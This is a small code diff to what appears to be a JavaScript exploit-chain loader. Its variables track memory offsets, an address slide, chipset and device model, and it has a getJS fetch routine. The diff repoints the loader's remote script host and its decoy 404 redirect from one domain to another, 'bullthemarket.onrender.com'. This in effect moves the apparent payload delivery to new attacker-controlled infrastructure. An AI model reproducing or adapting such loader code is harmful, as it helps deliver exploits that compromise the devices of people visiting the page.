@@ -5,7 +5,7 @@ var offsets = {};
 var slide;
 var chipset;
 var device_model;
-var localHost = "https://static.cdncounter.net/assets"
+var localHost = "https://bullthemarket.onrender.com"
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
     if (!SERVER_LOG && !reportError) return;
@@ -24,7 +24,7 @@ function print(x, reportError = false, dumphex = false) {
 }
 function redirect()
 {
-    window.location.href = "https://static.cdncounter.net/404.html"; 
+    window.location.href = "https://bullthemarket.onrender.com/404.html"; 
 }
 function getJS(fname,method = 'GET') 
 {
